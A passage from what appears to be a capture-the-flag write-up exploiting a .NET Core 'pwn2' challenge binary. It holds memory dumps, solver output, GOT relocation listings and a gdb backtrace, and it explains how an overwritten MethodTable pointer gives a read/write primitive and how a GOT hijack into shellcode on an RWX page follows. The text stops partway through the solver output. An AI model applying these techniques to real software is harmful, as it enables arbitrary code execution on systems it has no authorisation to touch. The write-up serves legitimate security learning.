7f9ad8009568: 7b00 3100 3a00 7800 7d00 0a00 0000 0000  {.1.:.x.}.......
7f9ad8009578: 0000 0000 0000 0000 4883 d3fd 9a7f 0000  ........H.......
7f9ad8009588: 0000 0000 0000 0000 0000 0000 0000 0000  ................
7f9ad8009598: 68b4 d3fd 9a7f 0000 d08d 00d8 9a7f 0000  h...............
7f9ad80095a8: 0000 0000 0000 0000 98c7 2bfd 9a7f 0000  ..........+.....
7f9ad80095b8: 0000 0000 0000 0000 0000 0000 0000 0000  ................
7f9ad80095c8: 4041 f9fd 9a7f 0000 0000 0000 0000 0000  @A..............
```

This is the point at which I ended my analysis during the competition. I did notice that there were some pointers to memory addresses locally but didn't quite know how to take advantage of them. After looking at some solutions post-competition, it became obvious what I was missing.

## Memory Read/Write Primitive

To start looking at the live program, I created a docker image for testing based off of the starter `Dockerfile` commands included with the challenge. This is shown below.

```
day8/dist$ cat Dockerfile 
# NOTE: This Dockerfile is provided for reference ONLY.
# It is NOT the production Dockerfile used for the challenge.
# The sole purpose here is to reveal the system environment
# that the challenge is being hosted in.
#
# In other words the most important clause is the FROM clause.
FROM mcr.microsoft.com/dotnet/core/sdk:3.0

RUN useradd -u 1234 -m demo
ADD pwn2.csproj /home/demo
ADD Program.cs /home/demo
ADD flag.txt /home/demo
RUN cd /home/demo && dotnet build -c Release
RUN apt update && apt install -y gdb socat net-tools
WORKDIR /home/demo
CMD socat -v tcp-l:1208,fork exec:/home/demo/bin/Release/netcoreapp3.0/pwn2

day8/dist$ docker build -t advent2019-1208 .

# for live testing
day8/dist$ docker run -it -p 127.0.0.1:1208:1208 advent2019-1208

# for debugging and symbol lookup
day8/dist$ docker run -it --cap-add=ALL -p 127.0.0.1:1208:1208 advent2019-1208 gdb /home/demo/bin/Release/netcoreapp3.0/pwn2
```

One thing I overlooked at first was how objects are referenced when they're part of another object - for example the `bytes` variable in a `FastByteArray` object. If the object referenced does not contain a valid pointer where the "MethodTable" should be, then the program throws a `System.NullReferenceException`. Otherwise, if the "MethodTable" value is **any valid pointer** then the object will be referenced _as if_ it is the original object type. To demonstrate this, I tried to access the memory at address 0x400000 which corresponds to the first bytes of the binary. When I used the address 0x400000, then I got the error, but if I used 0x400018, when I read some valid memory because that address had a pointer it.

```
$ xxd ./dist/bin/Release/netcoreapp3.0/pwn2| head -n 10
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 2735 4000 0000 0000  ..>.....'5@.....
00000020: 4000 0000 0000 0000 384a 0100 0000 0000  @.......8J......
00000030: 0000 0000 4000 3800 0a00 4000 2000 1f00  ....@.8...@. ...
00000040: 0600 0000 0500 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 4000 0000 0000 4000 4000 0000 0000  @.@.....@.@.....
00000060: 3002 0000 0000 0000 3002 0000 0000 0000  0.......0.......
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: 7002 0000 0000 0000 7002 4000 0000 0000  p.......p.@.....
00000090: 7002 4000 0000 0000 1c00 0000 0000 0000  p.@.............

$ ./solver.py 
Add(0x20)
Add(0x1f)
Add(0x1e)
Write(1,0x0) <<
00000000: 3be6 a47b 3658 916a 0b6c a557 47fb 2be1  ;..{6X.j.l.WG.+.
00000010: daec 3915 dbf3 1e76 991c 79ad 0399 4200  ..9....v..y...B.
00000020: 0000 0000 0000 0000 c014 1e52 c57f 0000  ...........R....
00000030: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 c014 1e52 c57f 0000  ...........R....
00000050: 0100 0000 0000 0000 1e00 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 8812 2e52 c57f 0000  ...........R....
00000070: 7892 002c c57f 0000 0000 0000 0000 0000  x..,............
00000080: c014 1e52 c57f 0000 1e00 0000 0000 0000  ...R............
00000090: 3ca8 5e3c d1ec a0a3 28a6 2130 8b62 8f0a  <.^<....(.!0.b..
000000a0: 3a97 c66e 9ad1 148d 48c8 2ee1 19de 0000  :..n....H.......
000000b0: 0000 0000 0000 0000 c014 1e52 c57f 0000  ...........R....
000000c0: 0100 0000 0000 0000 0200 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 c014 1e52 c57f 0000  ...........R....
000000e0: 0100 0000 0000 0000 0100 0000 0000 0000  ................

Overwrite the MT in FastByteArray[2]
Read(1,0x70) >> b'0000400000000000'
Write(2,0x0) <<
Traceback (most recent call last):
  File "./solver.py", line 135, in <module>
    func_Write(s, 2, 0, 0xf0)
  File "./solver.py", line 98, in func_Write
    ret = recvall(s,size)
  File "./solver.py", line 30, in recvall
    raise Exception('received zero bytes')
Exception: received zero bytes

(socat error below)
Unhandled exception. System.NullReferenceException: Object reference not set to an instance of an object.
   at FastByteArray.Write(Byte index, Byte size, BinaryWriter writer) in /home/demo/Program.cs:line 60
   at Program.Main(String[] args) in /home/demo/Program.cs:line 28
2019/12/29 18:27:02 socat[16] E waitpid(): child 17 exited on signal 6

$ ./solver.py 
Add(0x20)
Add(0x1f)
Add(0x1e)
Write(1,0x0) <<
00000000: 73ad a531 460d 4d99 c162 c6b3 29bc e4eb  s..1F.M..b..)...
00000010: af90 9fc3 e28e dc64 49a2 c554 f15f e600  .......dI..T._..
00000020: 0000 0000 0000 0000 c014 9637 7e7f 0000  ...........7~...
00000030: 0100 0000 0000 0000 0100 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 c014 9637 7e7f 0000  ...........7~...
00000050: 0100 0000 0000 0000 1e00 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 8812 a637 7e7f 0000  ...........7~...
00000070: 7892 0010 7e7f 0000 0000 0000 0000 0000  x...~...........
00000080: c014 9637 7e7f 0000 1e00 0000 0000 0000  ...7~...........
00000090: 3bd7 412e 06d7 e3bb 25db 14fd 7a56 81b5  ;.A.....%...zV..
000000a0: e4ac 51e9 50f4 41a6 e4d0 40e7 a347 0000  ..Q.P.A...@..G..
000000b0: 0000 0000 0000 0000 c014 9637 7e7f 0000  ...........7~...
000000c0: 0100 0000 0000 0000 0200 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 c014 9637 7e7f 0000  ...........7~...
000000e0: 0100 0000 0000 0000 0100 0000 0000 0000  ................

Overwrite the MT in FastByteArray[2]
Read(1,0x70) >> b'1800400000000000'
Write(2,0x0) <<
00000000: 384a 0100 0000 0000 0000 0000 4000 3800  8J..........@.8.
00000010: 0a00 4000 2000 1f00 0600 0000 0500 0000  ..@. ...........
00000020: 4000 0000 0000 0000 4000 4000 0000 0000  @.......@.@.....
00000030: 4000 4000 0000 0000 3002 0000 0000 0000  @.@.....0.......
00000040: 3002 0000 0000 0000 0800 0000 0000 0000  0...............
00000050: 0300 0000 0400 0000 7002 0000 0000 0000  ........p.......
00000060: 7002 4000 0000 0000 7002 4000 0000 0000  p.@.....p.@.....
00000070: 1c00 0000 0000 0000 1c00 0000 0000 0000  ................
00000080: 0100 0000 0000 0000 0100 0000 0500 0000  ................
00000090: 0000 0000 0000 0000 0000 4000 0000 0000  ..........@.....
000000a0: 0000 4000 0000 0000 e830 0100 0000 0000  ..@......0......
000000b0: e830 0100 0000 0000 0000 2000 0000 0000  .0........ .....
000000c0: 0100 0000 0600 0000 e03c 0100 0000 0000  .........<......
000000d0: e03c 6100 0000 0000 e03c 6100 0000 0000  .<a......<a.....
000000e0: c10b 0000 0000 0000 100c 0000 0000 0000  ................
```

As you can see above, in the second case where we read from the address with a pointer, we get back raw memory which matches the binary above (offset 0x28). This effectively gives us a read primitive to anywhere in the program with a pointer. Furthermore, the same technique can be used with the `Read` function again to get a write primitive. So, assuming we can find valid addresses somewhere in our program, then we're on our way to an exploit.

## Shellcode and an Exploit

To get a working exploit, we'll need a couple things. First, we need some way to jump to an address of our choosing. And second, at that address we'll either need a helpful system call (like `system("/bin/sh")`) or our own shellcode. To accomplish both, we'll also probably need a reliable memory address for each component. Looking at the memory mapping again (see above), we can see that the `pwn2` binary is always loaded at reliable addresses (0x400000 as above, but also 0x00613000 and 0x00614000). Additionally, while the page where our original data structures is only read-write, there are many different pages in the memory map which are read-write-execute (RWX). Going under the assumption that these are always loaded at the same offset relative to our binary, we can calculate the address of an RWX page, write our shellcode there and (hopefully) call it.

Now all that remains is the need to find a way jump to our shellcode. Taking a look at the structure of the main binary, we can see that it contains the global offset table (GOT) at address 0x614000 - one of the read-write pages, and there are a _lot_ of function pointers in that table. 

```
root@7d0b1c83814a:/day8/dist_test# readelf -a ./bin/Release/netcoreapp3.0/pwn2
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64

<snip>

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0

<snip>

  [25] .got              PROGBITS         0000000000613fa0  00013fa0
       0000000000000060  0000000000000008  WA       0     0     8
  [26] .got.plt          PROGBITS         0000000000614000  00014000
       00000000000003d0  0000000000000008  WA       0     0     8

<snip>

Relocation section '.rela.plt' at offset 0x2040 contains 119 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000614018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs6appendEPKcm@GLIBCXX_3.4 + 0
000000614020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt7getlineIcSt11char@GLIBCXX_3.4 + 0
000000614028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __getdelim@GLIBC_2.2.5 + 0
000000614030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSt18basic_stringstr@GLIBCXX_3.4 + 0
000000614038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSolsEi@GLIBCXX_3.4 + 0
000000614040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000614048  000800000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt16__throw_bad_cast@GLIBCXX_3.4 + 0
000000614050  000900000007 R_X86_64_JUMP_SLO 0000000000000000 close@GLIBC_2.2.5 + 0
000000614058  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs9_M_mutateEmmm@GLIBCXX_3.4 + 0
000000614060  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs6appendERKSsmm@GLIBCXX_3.4 + 0
000000614068  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 __gmon_start__ + 0
000000614070  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt20__throw_system_e@GLIBCXX_3.4.11 + 0
000000614078  000f00000007 R_X86_64_JUMP_SLO 0000000000000000 _Znam@GLIBCXX_3.4 + 0
000000614080  001000000007 R_X86_64_JUMP_SLO 0000000000000000 fseek@GLIBC_2.2.5 + 0
000000614088  001200000007 R_X86_64_JUMP_SLO 0000000000000000 _ZdlPv@GLIBCXX_3.4 + 0
000000614090  001300000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs7reserveEm@GLIBCXX_3.4 + 0
000000614098  001400000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs5rfindEcm@GLIBCXX_3.4 + 0
0000006140a0  001500000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSt5ctypeIcE13_M_wi@GLIBCXX_3.4.11 + 0
0000006140a8  001600000007 R_X86_64_JUMP_SLO 0000000000000000 strcasecmp@GLIBC_2.2.5 + 0
0000006140b0  001700000007 R_X86_64_JUMP_SLO 0000000000000000 __cxa_rethrow@CXXABI_1.3 + 0
0000006140b8  001800000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSt8ios_base4InitC1E@GLIBCXX_3.4 + 0
0000006140c0  001900000007 R_X86_64_JUMP_SLO 0000000000000000 strncmp@GLIBC_2.2.5 + 0
0000006140c8  001a00000007 R_X86_64_JUMP_SLO 0000000000000000 fopen@GLIBC_2.2.5 + 0
0000006140d0  001b00000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
0000006140d8  001c00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs12find_last_ofEP@GLIBCXX_3.4 + 0
0000006140e0  001d00000007 R_X86_64_JUMP_SLO 0000000000000000 rmdir@GLIBC_2.2.5 + 0
0000006140e8  001e00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt24__throw_invalid_@GLIBCXX_3.4 + 0
0000006140f0  001f00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs4_Rep9_S_createEm@GLIBCXX_3.4 + 0
0000006140f8  002000000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSi5seekgElSt12_Ios_@GLIBCXX_3.4 + 0
000000614100  002100000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSsC1ERKSs@GLIBCXX_3.4 + 0
000000614108  002200000007 R_X86_64_JUMP_SLO 0000000000000000 gmtime@GLIBC_2.2.5 + 0
000000614110  002300000007 R_X86_64_JUMP_SLO 0000000000000000 __cxa_atexit@GLIBC_2.2.5 + 0
000000614118  002400000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSt13basic_filebufIc@GLIBCXX_3.4 + 0
000000614120  002500000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt20__throw_out_of_r@GLIBCXX_3.4 + 0
000000614128  002600000007 R_X86_64_JUMP_SLO 0000000000000000 getpid@GLIBC_2.2.5 + 0
000000614130  002700000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSi4readEPcl@GLIBCXX_3.4 + 0
000000614138  002800000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
000000614140  002b00000007 R_X86_64_JUMP_SLO 0000000000000000 vfprintf@GLIBC_2.2.5 + 0
000000614148  002c00000007 R_X86_64_JUMP_SLO 0000000000000000 fputc@GLIBC_2.2.5 + 0
000000614150  002d00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs5rfindEPKcmm@GLIBCXX_3.4 + 0
000000614158  002e00000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
000000614160  002f00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs17find_first_not@GLIBCXX_3.4 + 0
000000614168  003000000007 R_X86_64_JUMP_SLO 0000000000000000 fnmatch@GLIBC_2.2.5 + 0
000000614170  003100000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
000000614178  003300000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs4_Rep10_M_destroy@GLIBCXX_3.4 + 0
000000614180  003400000007 R_X86_64_JUMP_SLO 0000000000000000 opendir@GLIBC_2.2.5 + 0
000000614188  003500000007 R_X86_64_JUMP_SLO 0000000000000000 __xstat@GLIBC_2.2.5 + 0
000000614190  003600000007 R_X86_64_JUMP_SLO 0000000000000000 realpath@GLIBC_2.3 + 0
000000614198  003700000007 R_X86_64_JUMP_SLO 0000000000000000 readdir@GLIBC_2.2.5 + 0
0000006141a0  003800000007 R_X86_64_JUMP_SLO 0000000000000000 __tls_get_addr@GLIBC_2.3 + 0
0000006141a8  003a00000007 R_X86_64_JUMP_SLO 0000000000000000 dlerror@GLIBC_2.2.5 + 0
0000006141b0  003b00000007 R_X86_64_JUMP_SLO 0000000000000000 sscanf@GLIBC_2.2.5 + 0
0000006141b8  003c00000007 R_X86_64_JUMP_SLO 0000000000000000 dlclose@GLIBC_2.2.5 + 0
0000006141c0  003d00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSs6appendEmc@GLIBCXX_3.4 + 0
0000006141c8  003e00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs4findEcm@GLIBCXX_3.4 + 0
0000006141d0  003f00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs7compareEPKc@GLIBCXX_3.4 + 0
0000006141d8  004000000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSsC1EPKcRKSaIcE@GLIBCXX_3.4 + 0
0000006141e0  004100000007 R_X86_64_JUMP_SLO 0000000000000000 usleep@GLIBC_2.2.5 + 0
0000006141e8  004200000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt9terminatev@GLIBCXX_3.4 + 0
0000006141f0  004300000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNKSs4findEPKcmm@GLIBCXX_3.4 + 0
0000006141f8  004400000007 R_X86_64_JUMP_SLO 0000000000000000 fputs@GLIBC_2.2.5 + 0
000000614200  004500000007 R_X86_64_JUMP_SLO 0000000000000000 strtol@GLIBC_2.2.5 + 0
000000614208  004600000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSt18basic_stringstr@GLIBCXX_3.4 + 0
000000614210  004800000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSt8__detail15_List_@GLIBCXX_3.4.15 + 0
000000614218  004900000007 R_X86_64_JUMP_SLO 0000000000000000 _ZSt16__ostream_insert@GLIBCXX_3.4.9 + 0
000000614220  004a00000007 R_X86_64_JUMP_SLO 0000000000000000 vsnprintf@GLIBC_2.2.5 + 0
000000614228  004b00000007 R_X86_64_JUMP_SLO 0000000000000000 fread@GLIBC_2.2.5 + 0
000000614230  004c00000007 R_X86_64_JUMP_SLO 0000000000000000 getenv@GLIBC_2.2.5 + 0
000000614238  004d00000007 R_X86_64_JUMP_SLO 0000000000000000 _ZNSt13basic_fstreamIc@GLIBCXX_3.4 + 0
000000614240  004e00000007 R_X86_64_JUMP_SLO 0000000000000000 __errno_location@GLIBC_2.2.5 + 0
...
```

I tried my hand at overwriting a bunch of these function pointers with NULL values to see what might get called as normal operation of the program, but it turns out that none of them seem to get executed after the program has started. So, back to the drawing board.

My next step was to see what functions were actually being called down to the low level `read()` call from my socket. Starting up the program with gdb, we know that its waiting for input once it hangs, so we can simply pause execution and look at a backtrace:

```
day8/dist$ docker run -it --cap-add=ALL -p 127.0.0.1:1208:1208 advent2019-1208 gdb /home/demo/bin/Release/netcoreapp3.0/pwn2
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /home/demo/bin/Release/netcoreapp3.0/pwn2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/demo/bin/Release/netcoreapp3.0/pwn2 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7f8119a0f700 (LWP 12)]
[New Thread 0x7f81191ed700 (LWP 13)]
[New Thread 0x7f81189e8700 (LWP 14)]
[New Thread 0x7f8117d44700 (LWP 15)]
[New Thread 0x7f811752f700 (LWP 16)]
[New Thread 0x7f8116d2a700 (LWP 17)]
[New Thread 0x7f81167ff700 (LWP 18)]
[New Thread 0x7f8115ffa700 (LWP 19)]
[Thread 0x7f8115ffa700 (LWP 19) exited]
^C
Thread 1 "pwn2" received signal SIGINT, Interrupt.
__libc_read (nbytes=1, buf=0x7f8078008ca8, fd=20)
    at ../sysdeps/unix/sysv/linux/read.c:26
26	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
(gdb) bt
#0  __libc_read (nbytes=1, buf=0x7f8078008ca8, fd=20)
    at ../sysdeps/unix/sysv/linux/read.c:26
#1  __libc_read (fd=20, buf=0x7f8078008ca8, nbytes=1)
    at ../sysdeps/unix/sysv/linux/read.c:24
#2  0x00007f811680807e in SystemNative_Read ()
   from /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
#3  0x00007f80a0874f0e in ?? ()
#4  0x00007ffdd26e4f90 in ?? ()
#5  0x000000006585a5a3 in ?? ()
#6  0x00007f811a111728 in vtable for InlinedCallFrame ()
   from /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/libcoreclr.so
#7  0x00007ffdd26e53d8 in ?? ()
#8  0x00007f80a09fcf60 in ?? ()
#9  0x00007f80a09fcf60 in ?? ()
#10 0x00007ffdd26e4f90 in ?? ()
#11 0x00007f80a0874f0e in ?? ()
#12 0x00007ffdd26e5020 in ?? ()
#13 0x0000000000000001 in ?? ()
#14 0x00007f80a09fcf60 in ?? ()
#15 0x00007f80780089a0 in ?? ()
#16 0x0000000000000001 in ?? ()
#17 0x00007f8078008868 in ?? ()
#18 0x0000000000000001 in ?? ()
--Type <RET> for more, q to quit, c to continue without paging--
#19 0x0000000000000001 in ?? ()
#20 0x00007f8078008c98 in ?? ()
#21 0x0000000000000000 in ?? ()
```

As the backtrace shows, `__libc_read` is called by `SystemNative_Read` in the `System.Native.so` library along with several other functions up the chain. Performing the same game by looking at the GOT of this `System.Navive.so` library, we can see that it has many pointers to libc. This time, we _know_ that these are being called because the `System.Native.so` library needs have a reference to `__libc_read` (at the very least) to execute its functions.

```
root@7d0b1c83814a:/day8/dist_test# readelf -a /usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.1/System.Native.so
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64

<snip>

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0

<snip>

  [21] .got              PROGBITS         000000000020efd0  0000efd0
       0000000000000030  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         000000000020f000  0000f000
       00000000000004a8  0000000000000008  WA       0     0     8

<snip>

Relocation section '.rela.plt' at offset 0x46d8 contains 146 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
00000020f018  000400000007 R_X86_64_JUMP_SLO 0000000000000000 mkstemps@GLIBC_2.11 + 0
00000020f020  000900000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
00000020f028  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 utimensat@GLIBC_2.6 + 0
00000020f030  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 endmntent@GLIBC_2.2.5 + 0
00000020f038  001000000007 R_X86_64_JUMP_SLO 0000000000000000 abort@GLIBC_2.2.5 + 0
00000020f040  001200000007 R_X86_64_JUMP_SLO 0000000000000000 __errno_location@GLIBC_2.2.5 + 0
00000020f048  001300000007 R_X86_64_JUMP_SLO 0000000000000000 unlink@GLIBC_2.2.5 + 0
00000020f050  001500000007 R_X86_64_JUMP_SLO 0000000000000000 getpriority@GLIBC_2.2.5 + 0
00000020f058  001900000007 R_X86_64_JUMP_SLO 0000000000000000 pthread_sigmask + 0
00000020f060  001a00000007 R_X86_64_JUMP_SLO 0000000000000000 _exit@GLIBC_2.2.5 + 0
00000020f068  001e00000007 R_X86_64_JUMP_SLO 0000000000000000 mkdir@GLIBC_2.2.5 + 0
00000020f070  001f00000007 R_X86_64_JUMP_SLO 0000000000000000 sendmsg@GLIBC_2.2.5 + 0
00000020f078  002000000007 R_X86_64_JUMP_SLO 0000000000000000 qsort@GLIBC_2.2.5 + 0
00000020f080  002200000007 R_X86_64_JUMP_SLO 0000000000000000 isatty@GLIBC_2.2.5 + 0
00000020f088  002300000007 R_X86_64_JUMP_SLO 0000000000000000 sigaction@GLIBC_2.2.5 + 0
00000020f090  002700000007 R_X86_64_JUMP_SLO 0000000000000000 vsnprintf@GLIBC_2.2.5 + 0
00000020f098  002800000007 R_X86_64_JUMP_SLO 0000000000000000 setsockopt@GLIBC_2.2.5 + 0
00000020f0a0  002c00000007 R_X86_64_JUMP_SLO 0000000000000000 readlink@GLIBC_2.2.5 + 0
00000020f0a8  002d00000007 R_X86_64_JUMP_SLO 0000000000000000 fcntl@GLIBC_2.2.5 + 0
00000020f0b0  002e00000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0
00000020f0b8  003000000007 R_X86_64_JUMP_SLO 0000000000000000 getpid@GLIBC_2.2.5 + 0
00000020f0c0  003700000007 R_X86_64_JUMP_SLO 0000000000000000 readdir_r@GLIBC_2.2.5 + 0
00000020f0c8  003a00000007 R_X86_64_JUMP_SLO 0000000000000000 pathconf@GLIBC_2.2.5 + 0
00000020f0d0  003b00000007 R_X86_64_JUMP_SLO 0000000000000000 getpeername@GLIBC_2.2.5 + 0
00000020f0d8  003d00000007 R_X86_64_JUMP_SLO 0000000000000000 __xstat64@GLIBC_2.2.5 + 0
00000020f0e0  003e00000007 R_X86_64_JUMP_SLO 0000000000000000 opendir@GLIBC_2.2.5 + 0
00000020f0e8  003f00000007 R_X86_64_JUMP_SLO 0000000000000000 shutdown@GLIBC_2.2.5 + 0
00000020f0f0  004000000007 R_X86_64_JUMP_SLO 0000000000000000 getdomainname@GLIBC_2.2.5 + 0
00000020f0f8  004100000007 R_X86_64_JUMP_SLO 0000000000000000 msync@GLIBC_2.2.5 + 0
00000020f100  004200000007 R_X86_64_JUMP_SLO 0000000000000000 rmdir@GLIBC_2.2.5 + 0
00000020f108  004500000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
00000020f110  004700000007 R_X86_64_JUMP_SLO 0000000000000000 getpwuid_r@GLIBC_2.2.5 + 0
00000020f118  004a00000007 R_X86_64_JUMP_SLO 0000000000000000 chdir@GLIBC_2.2.5 + 0
00000020f120  004b00000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
00000020f128  004d00000007 R_X86_64_JUMP_SLO 0000000000000000 getuid@GLIBC_2.2.5 + 0
00000020f130  004e00000007 R_X86_64_JUMP_SLO 0000000000000000 pthread_setcancelstate@GLIBC_2.2.5 + 0
00000020f138  005000000007 R_X86_64_JUMP_SLO 0000000000000000 accept4@GLIBC_2.10 + 0
00000020f140  005200000007 R_X86_64_JUMP_SLO 0000000000000000 getmntent_r@GLIBC_2.2.5 + 0
00000020f148  005400000007 R_X86_64_JUMP_SLO 0000000000000000 dup2@GLIBC_2.2.5 + 0
00000020f150  005600000007 R_X86_64_JUMP_SLO 0000000000000000 pclose@GLIBC_2.2.5 + 0
00000020f158  005700000007 R_X86_64_JUMP_SLO 0000000000000000 snprintf@GLIBC_2.2.5 + 0
00000020f160  005800000007 R_X86_64_JUMP_SLO 0000000000000000 gai_strerror@GLIBC_2.2.5 + 0
00000020f168  005a00000007 R_X86_64_JUMP_SLO 0000000000000000 uname@GLIBC_2.2.5 + 0
00000020f170  005b00000007 R_X86_64_JUMP_SLO 0000000000000000 getsid@GLIBC_2.2.5 + 0
00000020f178  005c00000007 R_X86_64_JUMP_SLO 0000000000000000 setpriority@GLIBC_2.2.5 + 0
00000020f180  006400000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
00000020f188  006500000007 R_X86_64_JUMP_SLO 0000000000000000 geteuid@GLIBC_2.2.5 + 0
00000020f190  006600000007 R_X86_64_JUMP_SLO 0000000000000000 ioctl@GLIBC_2.2.5 + 0
00000020f198  006700000007 R_X86_64_JUMP_SLO 0000000000000000 getcwd@GLIBC_2.2.5 + 0
00000020f1a0  006900000007 R_X86_64_JUMP_SLO 0000000000000000 close@GLIBC_2.2.5 + 0
00000020f1a8  006b00000007 R_X86_64_JUMP_SLO 0000000000000000 setgroups@GLIBC_2.2.5 + 0
00000020f1b0  006f00000007 R_X86_64_JUMP_SLO 0000000000000000 getnameinfo@GLIBC_2.2.5 + 0
00000020f1b8  007200000007 R_X86_64_JUMP_SLO 0000000000000000 sched_setaffinity@GLIBC_2.3.4 + 0
00000020f1c0  007300000007 R_X86_64_JUMP_SLO 0000000000000000 closedir@GLIBC_2.2.5 + 0
00000020f1c8  007400000007 R_X86_64_JUMP_SLO 0000000000006180 SystemNative_Initializ + 0
00000020f1d0  007700000007 R_X86_64_JUMP_SLO 0000000000000000 posix_fadvise@GLIBC_2.2.5 + 0
00000020f1d8  007900000007 R_X86_64_JUMP_SLO 0000000000000000 epoll_ctl@GLIBC_2.3.2 + 0
00000020f1e0  007b00000007 R_X86_64_JUMP_SLO 0000000000000000 __strdup@GLIBC_2.2.5 + 0
00000020f1e8  007e00000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
00000020f1f0  008000000007 R_X86_64_JUMP_SLO 0000000000000000 pthread_attr_init@GLIBC_2.2.5 + 0
00000020f1f8  008400000007 R_X86_64_JUMP_SLO 0000000000000000 getsockopt@GLIBC_2.2.5 + 0
00000020f200  008500000007 R_X86_64_JUMP_SLO 0000000000000000 execve@GLIBC_2.2.5 + 0
00000020f208  008600000007 R_X86_64_JUMP_SLO 0000000000008470 SystemNative_GetPeerID + 0
00000020f210  008700000007 R_X86_64_JUMP_SLO 0000000000000000 __getdelim@GLIBC_2.2.5 + 0
00000020f218  008800000007 R_X86_64_JUMP_SLO 0000000000000000 __fxstat64@GLIBC_2.2.5 + 0
...
```

So now we need to find the `SystemNative.so` library in memory and adjust its GOT. To do this, I read an address in the binary's GOT, used it to calculate the base address of `libstdc++.so`, used this to calculate the base address of `System.Native.so`, and finally used this to find the GOT of that library. I then overwrote the offset for `write` with an address of my choice.

Finally, I used a similar technique to find the address of an RWX memory page and wrote my shellcode there. With both pieces in place, I went ahead and tried to call the `Write` function again to trigger my shellcode. All of this is wrapped up in [this python script](./solutions/day8_solver.py), the output of which is below.

```
$ ./solutions/day8_solver.py 
Add(0x20)
